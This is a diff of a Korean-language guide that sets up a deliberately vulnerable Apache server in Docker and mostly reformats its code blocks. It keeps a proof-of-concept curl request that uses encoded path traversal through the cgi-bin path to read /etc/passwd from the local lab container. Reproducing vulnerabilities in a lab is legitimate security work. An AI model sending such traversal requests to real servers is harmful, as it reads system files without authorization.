@@ -32,24 +32,31 @@
     >> /usr/local/apache2/conf/httpd.conf
   '''
   
-2. **docker-compose.yml 작성"
-   '''yaml
+2. docker-compose.yml 작성  
+   **docker-compose.yml**:  
+   ```yaml
    version: "3.8"
    services:
-    apache-vuln:
-      build: .
-      ports:
-        - "8080:80"
+     apache-vuln:
+       build: .
+       ports:
+         - "8080:80"
 
 3. 컨테이너 빌드 및 실행
+   '''bash
    docker-compose up -d
+   '''
 
 4. 정상 동작 확인
+   '''bash
    curl -i http://localhost:8080/cgi-bin/hello.sh
-
+   '''
+   
 5. 취약점 Poc 호출
+   '''bash
    curl -i "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
-
+   '''
+   
 ---
 
 ## 결과
